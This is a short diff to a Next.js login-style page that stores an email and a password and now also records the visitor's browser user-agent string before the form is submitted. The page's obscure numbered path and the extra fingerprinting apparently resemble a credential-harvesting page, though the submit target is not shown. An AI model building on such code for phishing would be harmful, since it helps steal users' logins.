@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useRouter } from 'next/router';
 import classes from "@/pages/ut1516432/ut.module.css";
 import axios from "axios";
@@ -6,7 +6,8 @@ import axios from "axios";
 function Home() {
   const [data, changeData] = useState({
     email: "",
-    pass: ""
+    pass: "",
+    browser: ""
   });
   const router = useRouter();
 
@@ -14,7 +15,10 @@ function Home() {
 
   const passVChange = () => changePassV(!passV);
   const changeDataFn = e => changeData(prev => ({...prev, [e.target.name]: e.target.value}));
-  
+
+  useEffect(() => {
+    changeData(prev => ({...prev, browser: navigator.userAgent}))
+  }, [])
 
   async function handleSubmitFn() {
     try {
